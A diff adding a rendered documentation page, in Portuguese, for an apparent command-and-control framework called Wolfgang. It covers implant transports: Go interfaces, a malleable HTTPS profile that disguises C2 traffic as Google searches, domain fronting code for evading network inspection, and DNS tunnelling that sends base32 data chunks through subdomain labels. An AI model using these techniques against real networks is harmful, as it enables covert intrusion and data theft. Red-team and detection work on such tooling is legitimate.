+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/vault-extraction/">
+<span class="md-ellipsis">
+    
+  
+    Vault Extraction
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/persistence/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Persistence
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/windows-registry/">
+<span class="md-ellipsis">
+    
+  
+    Windows Registry
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/scheduled-tasks/">
+<span class="md-ellipsis">
+    
+  
+    Scheduled Tasks
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/linux-cron/">
+<span class="md-ellipsis">
+    
+  
+    Linux Cron
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/macos-launchd/">
+<span class="md-ellipsis">
+    
+  
+    macOS Launchd
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_6_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Lateral Movement
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/port-forwarding/">
+<span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/socks-proxy/">
+<span class="md-ellipsis">
+    
+  
+    SOCKS Proxy
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/pivot-chains/">
+<span class="md-ellipsis">
+    
+  
+    Pivot Chains
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/remote-execution/">
+<span class="md-ellipsis">
+    
+  
+    Remote Execution
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_7" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../modules/">
+<span class="md-ellipsis">
+    
+  
+    Module Catalog
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Module Catalog
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/shell/">
+<span class="md-ellipsis">
+    
+  
+    Shell
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/fileops/">
+<span class="md-ellipsis">
+    
+  
+    File Operations
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/recon/">
+<span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/persist/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/lateral/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/credential/">
+<span class="md-ellipsis">
+    
+  
+    Credentials
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/exfil/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_8" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../api/">
+<span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_8_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_8">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    API Reference
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="transports">Transports<a class="headerlink" href="#transports" title="Permanent link">¶</a></h1>
+<p>O Wolfgang implementa uma <strong>abstraccao de transport</strong> que permite que qualquer protocolo de rede carregue envelopes identicos. O implant nao sabe (e nao precisa saber) se esta comunicando via HTTPS, DNS ou WebSocket — ele so ve a interface <code>ImplantTransport</code>.</p>
+<h2 id="abstraccao-de-transport">Abstraccao de Transport<a class="headerlink" href="#abstraccao-de-transport" title="Permanent link">¶</a></h2>
+<pre class="mermaid"><code>classDiagram
+    class ImplantTransport {
+        &lt;<interface>&gt;
+        +CheckIn(ctx, session, seq) []taskDispatch, error
+        +SendResult(ctx, session, seq, result) error
+        +Name() string
+    }
+
+    class HTTPTransport {
+        -cfg *ImplantConfig
+        -client *http.Client
+        +CheckIn()
+        +SendResult()
+        +Name() "https"
+    }
+
+    class DoHTransport {
+        -cfg *ImplantConfig
+        -dohClient *doh.Client
+        +CheckIn()
+        +SendResult()
+        +Name() "doh"
+    }
+
+    class DNSTransport {
+        -cfg *ImplantConfig
+        -resolver net.Resolver
+        +CheckIn()
+        +SendResult()
+        +Name() "dns"
+    }
+
+    class WSTransport {
+        -cfg *ImplantConfig
+        -conn *websocket.Conn
+        +CheckIn()
+        +SendResult()
+        +Name() "ws"
+    }
+
+    class PipeTransport {
+        -cfg *ImplantConfig
+        -conn *PipeConn
+        +CheckIn()
+        +SendResult()
+        +Name() "pipe"
+    }
+
+    ImplantTransport &lt;|.. HTTPTransport
+    ImplantTransport &lt;|.. DoHTransport
+    ImplantTransport &lt;|.. DNSTransport
+    ImplantTransport &lt;|.. WSTransport
+    ImplantTransport &lt;|.. PipeTransport
+
+    class Reconnector {
+        -chain []ImplantTransport
+        -currentTransportIdx int
+        -consecutiveFailures int
+        +CurrentImplantTransport()
+        +RecordFailure() error
+        +RecordSuccess()
+    }
+
+    Reconnector --&gt; ImplantTransport : rotaciona
+
+    class ServerListener {
+        &lt;<interface>&gt;
+        +Name() string
+        +Start() error
+        +Stop() error
+    }
+
+    class HTTPListener {
+        -profile *Profile
+        -agentMgr *agent.Manager
+    }
+    class DNSListener {
+        -domain string
+        -partials map
+    }
+    class WSListener {
+        -conns map
+    }
+
+    ServerListener &lt;|.. HTTPListener
+    ServerListener &lt;|.. DNSListener
+    ServerListener &lt;|.. WSListener
+</interface></interface></code></pre>
+<p>A interface do lado implant:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1">// cmd/implant/transport.go</span>
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kd">type</span><span class="w"> </span><span class="nx">ImplantTransport</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">    </span><span class="nx">CheckIn</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">*</span><span class="nx">AgentSession</span><span class="p">,</span><span class="w"> </span><span class="nx">seq</span><span class="w"> </span><span class="kt">uint32</span><span class="p">)</span><span class="w"> </span><span class="p">([]</span><span class="nx">taskDispatch</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="nx">SendResult</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">*</span><span class="nx">AgentSession</span><span class="p">,</span><span class="w"> </span><span class="nx">seq</span><span class="w"> </span><span class="kt">uint32</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="nx">taskResult</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span>
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="nx">Name</span><span class="p">()</span><span class="w"> </span><span class="kt">string</span>
+<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="p">}</span>
+</code></pre></div>
+<p>O factory pattern constroi o transport adequado:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kd">func</span><span class="w"> </span><span class="nx">NewTransport</span><span class="p">(</span><span class="nx">name</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="nx">ImplantTransport</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">"https"</span><span class="p">,</span><span class="w"> </span><span class="s">"http"</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">NewHTTPTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">"doh"</span><span class="p">:</span><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="nx">NewDoHTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">"dns"</span><span class="p">:</span><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="nx">NewDNSTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">"ws"</span><span class="p">:</span><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">NewWSTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">"pipe"</span><span class="p">:</span><span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nx">NewPipeTransport</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="w">    </span><span class="k">default</span><span class="p">:</span><span class="w">              </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<a href="#__codelineno-1-9" id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-1-10" id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="p">}</span>
+</code></pre></div>
+<h2 id="https-listener">HTTPS Listener<a class="headerlink" href="#https-listener" title="Permanent link">¶</a></h2>
+<p>O HTTPS listener e o transport primario. Usa um <strong>malleable profile</strong> para disfarcar trafego C2 como navegacao web legitima.</p>
+<h3 id="malleable-profile">Malleable Profile<a class="headerlink" href="#malleable-profile" title="Permanent link">¶</a></h3>
+<p>O profile define como dados C2 sao embutidos em requests e responses HTTP:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c1">// pkg/transport/http/profile.go</span>
+<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="kd">type</span><span class="w"> </span><span class="nx">Profile</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="nx">Name</span><span class="w">   </span><span class="kt">string</span><span class="w">        </span><span class="s">`yaml:"name"`</span>
+<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">    </span><span class="nx">Client</span><span class="w"> </span><span class="nx">ClientProfile</span><span class="w"> </span><span class="s">`yaml:"client"`</span><span class="w">   </span><span class="c1">// como implant envia</span>
+<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span><span class="nx">Server</span><span class="w"> </span><span class="nx">ServerProfile</span><span class="w"> </span><span class="s">`yaml:"server"`</span><span class="w">   </span><span class="c1">// como server responde</span>
+<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="p">}</span>
+<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a>
+<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="kd">type</span><span class="w"> </span><span class="nx">ClientProfile</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-2-9" id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="w">    </span><span class="nx">GET</span><span class="w">  </span><span class="nx">TransactionProfile</span><span class="w"> </span><span class="s">`yaml:"get"`</span><span class="w">   </span><span class="c1">// check-in</span>
+<a href="#__codelineno-2-10" id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">    </span><span class="nx">POST</span><span class="w"> </span><span class="nx">TransactionProfile</span><span class="w"> </span><span class="s">`yaml:"post"`</span><span class="w">  </span><span class="c1">// task response</span>
+<a href="#__codelineno-2-11" id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="p">}</span>
+<a href="#__codelineno-2-12" id="__codelineno-2-12" name="__codelineno-2-12"></a>
+<a href="#__codelineno-2-13" id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="kd">type</span><span class="w"> </span><span class="nx">TransactionProfile</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-2-14" id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="w">    </span><span class="nx">URIs</span><span class="w">    </span><span class="p">[]</span><span class="kt">string</span><span class="w">          </span><span class="s">`yaml:"uris"`</span>
+<a href="#__codelineno-2-15" id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="w">    </span><span class="nx">Headers</span><span class="w"> </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="w"> </span><span class="s">`yaml:"headers"`</span>
+<a href="#__codelineno-2-16" id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="w">    </span><span class="nx">Params</span><span class="w">  </span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="w"> </span><span class="s">`yaml:"params"`</span>
+<a href="#__codelineno-2-17" id="__codelineno-2-17" name="__codelineno-2-17"></a><span class="w">    </span><span class="nx">Body</span><span class="w">    </span><span class="kt">string</span><span class="w">            </span><span class="s">`yaml:"body"`</span>
+<a href="#__codelineno-2-18" id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="p">}</span>
+</code></pre></div>
+<p>O profile default imita Google Search:</p>
+<table>
+<thead>
+<tr>
+<th>Aspecto</th>
+<th>Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Check-in URIs</td>
+<td><code>/search</code>, <code>/s</code></td>
+</tr>
+<tr>
+<td>Check-in param</td>
+<td><code>q={{data_base64}}&amp;client=firefox-b-d&amp;source=hp</code></td>
+</tr>
+<tr>
+<td>Response URIs</td>
+<td><code>/complete/search</code>, <code>/async/search</code></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</code></td>
+</tr>
+<tr>
+<td>Response Content-Type</td>
+<td><code>text/html; charset=UTF-8</code></td>
+</tr>
+<tr>
+<td>Response Server</td>
+<td><code>gws</code> (Google Web Server)</td>
+</tr>
+<tr>
+<td>Response body</td>
+<td><code>&lt;!doctype html&gt;&lt;html&gt;...&lt;body&gt;{{data_base64}}&lt;/body&gt;&lt;/html&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="fluxo-de-requestresponse">Fluxo de Request/Response<a class="headerlink" href="#fluxo-de-requestresponse" title="Permanent link">¶</a></h3>
+<p><strong>Check-in (GET):</strong></p>
+<ol>
+<li>Implant codifica envelope em base64</li>
+<li>Embute no query param <code>q</code> com parametros decorativos (<code>client=firefox-b-d</code>)</li>
+<li>Listener extrai via <code>ExtractData()</code> — procura o param com <code>{{data_base64}}</code></li>
+<li>Decodifica base64, obtem raw envelope bytes</li>
+</ol>
+<p><strong>Task Response (POST):</strong></p>
+<ol>
+<li>Implant codifica envelope em base64</li>
+<li>Embute no body como form-encoded: <code>q=BASE64&amp;oq=test&amp;gs_l=hp</code></li>
+<li>Listener extrai via template matching no body</li>
+</ol>
+<p><strong>Server Response:</strong></p>
+<ol>
+<li>Listener codifica envelope de resposta em base64</li>
+<li>Embute no template HTML: <code>&lt;body&gt;BASE64&lt;/body&gt;</code></li>
+<li>Define headers do profile (Content-Type, Server, Cache-Control)</li>
+</ol>
+<h3 id="domain-fronting">Domain Fronting<a class="headerlink" href="#domain-fronting" title="Permanent link">¶</a></h3>
+<p>O implant suporta domain fronting para evadir inspeccao de rede:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="c1">// cmd/implant/register.go</span>
+<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">NewTLSClient</span><span class="p">(</span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w">    </span><span class="nx">tlsCfg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">tls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span><span class="nx">InsecureSkipVerify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}</span>
+<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">FrontingDomain</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="w">        </span><span class="nx">tlsCfg</span><span class="p">.</span><span class="nx">ServerName</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">FrontingDomain</span><span class="w">  </span><span class="c1">// TLS SNI = CDN</span>
+<a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="w">    </span><span class="c1">// ...</span>
+<a href="#__codelineno-3-8" id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="p">}</span>
+<a href="#__codelineno-3-9" id="__codelineno-3-9" name="__codelineno-3-9"></a>
+<a href="#__codelineno-3-10" id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="c1">// Per-request: Host header aponta para o C2 real</span>
+<a href="#__codelineno-3-11" id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="kd">func</span><span class="w"> </span><span class="nx">applyFronting</span><span class="p">(</span><span class="nx">req</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-3-12" id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ActualHost</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-3-13" id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="w">        </span><span class="nx">req</span><span class="p">.</span><span class="nx">Host</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ActualHost</span><span class="w">  </span><span class="c1">// HTTP Host = C2</span>
+<a href="#__codelineno-3-14" id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-3-15" id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="p">}</span>
+</code></pre></div>
+<p>Resultado: network observer ve TLS SNI para <code>cdn.example.com</code>, mas o request chega ao C2 via Host header routing.</p>
+<h2 id="dns-listener">DNS Listener<a class="headerlink" href="#dns-listener" title="Permanent link">¶</a></h2>
+<p>O DNS listener implementa um <strong>servidor DNS autoritativo</strong> usando a biblioteca <code>miekg/dns</code>. DNS e o transport mais resiliente — funciona mesmo em redes altamente restritivas porque UDP 53 e quase universalmente permitido.</p>
+<h3 id="encoding">Encoding<a class="headerlink" href="#encoding" title="Permanent link">¶</a></h3>
+<p>Dados sao codificados em <strong>base32 sem padding</strong> nos labels de subdomain:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1">// pkg/transport/dns/listener.go</span>
+<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="kd">var</span><span class="w"> </span><span class="nx">base32Encoding</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">base32</span><span class="p">.</span><span class="nx">HexEncoding</span><span class="p">.</span><span class="nx">WithPadding</span><span class="p">(</span><span class="nx">base32</span><span class="p">.</span><span class="nx">NoPadding</span><span class="p">)</span>
+</code></pre></div>
+<p>Base32 (nao base64) porque DNS labels sao case-insensitive, e base32 usa apenas <code>[A-V0-9]</code>.</p>
+<h3 id="formato-de-labels">Formato de Labels<a class="headerlink" href="#formato-de-labels" title="Permanent link">¶</a></h3>
+<p><strong>Check-in (A query):</strong></p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a>&lt;agent_id_short&gt;.c2.example.com
+</code></pre></div>
+<p>Onde <code>agent_id_short</code> sao os primeiros 8 hex chars do agent ID. O listener resolve para o full ID via cache ou query ao storage.</p>
+<p><strong>Data upload (CNAME query):</strong></p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a>&lt;chunk_id&gt;.&lt;seq&gt;.&lt;base32_data&gt;.&lt;agent_id_short&gt;.c2.example.com
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Label</th>
+<th>Descricao</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>chunk_id</code></td>
+<td>Indice do chunk (0-based). Bit alto (<code>0x80</code>) marca chunk final</td>
+</tr>
+<tr>
+<td><code>seq</code></td>
+<td>Sequence number do envelope</td>
+</tr>
+<tr>
+<td><code>base32_data</code></td>
+<td>Dados codificados em base32 (max 63 chars por label)</td>
+</tr>
+<tr>
+<td><code>agent_id_short</code></td>
+<td>Primeiros 8 hex chars do agent ID</td>
+</tr>
+</tbody>
+</table>
+<h3 id="chunking-e-reassembly">Chunking e Reassembly<a class="headerlink" href="#chunking-e-reassembly" title="Permanent link">¶</a></h3>
+<pre class="mermaid"><code>sequenceDiagram
+    participant I as Implant
+    participant D as DNS Listener
+
+    Note over I: Envelope tem 500 bytes<br/>Base32 = ~800 chars<br/>Label max = 63 chars<br/>Precisa de multiplos chunks
+
+    I-&gt;&gt;D: CNAME 0.42.BASE32_CHUNK0.a1b2c3d4.c2.example.com
+    D--&gt;&gt;I: CNAME ok.c2.example.com
+
+    I-&gt;&gt;D: CNAME 1.42.BASE32_CHUNK1.a1b2c3d4.c2.example.com
+    D--&gt;&gt;I: CNAME ok.c2.example.com
+
+    I-&gt;&gt;D: CNAME 130.42.BASE32_CHUNK2.a1b2c3d4.c2.example.com
+    Note over I: chunk_id=130 = 2 | 0x80 (final flag)
+    D-&gt;&gt;D: Reassembla chunks 0+1+2
+    D-&gt;&gt;D: Decifra envelope completo
+    D-&gt;&gt;D: Processa task response
+    D--&gt;&gt;I: CNAME ok.c2.example.com
+</code></pre>
+<p>O listener mantem um mapa de <code>partialMessage</code> por <code>agentID+seq</code>:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="kd">type</span><span class="w"> </span><span class="nx">partialMessage</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="w">    </span><span class="nx">chunks</span><span class="w">   </span><span class="kd">map</span><span class="p">[</span><span class="kt">uint8</span><span class="p">][]</span><span class="kt">byte</span><span class="w"> </span><span class="c1">// chunkID -&gt; data</span>
+<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">    </span><span class="nx">total</span><span class="w">    </span><span class="kt">int</span><span class="w">              </span><span class="c1">// -1 ate ver final flag</span>
+<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">    </span><span class="nx">received</span><span class="w"> </span><span class="kt">int</span>
+<a href="#__codelineno-7-5" id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">    </span><span class="nx">created</span><span class="w">  </span><span class="nx">time</span><span class="p">.</span><span class="nx">Time</span>
+<a href="#__codelineno-7-6" id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="respostas-dns">Respostas DNS<a class="headerlink" href="#respostas-dns" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Cenario</th>
+<th>Tipo Record</th>
+<th>Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Check-in sem tasks</td>
+<td>A record</td>
+<td><code>1.0.0.0</code></td>
+</tr>
+<tr>
+<td>Check-in com tasks</td>
+<td>A record + TXT</td>
+<td><code>1.0.0.1</code> + base32 do envelope nos TXT records</td>
+</tr>
+<tr>
+<td>Ack de chunk</td>
+<td>CNAME</td>
+<td><code>ok.c2.example.com</code></td>
+</tr>
+<tr>
+<td>Query invalida</td>
+<td>NOERROR vazio</td>
+<td>(evita NXDOMAIN suspicioso)</td>
+</tr>
+</tbody>
+</table>
+<p>Tasks sao retornadas em <strong>TXT records</strong> base32-encoded, respeitando o limite de 255 bytes por TXT string:</p>
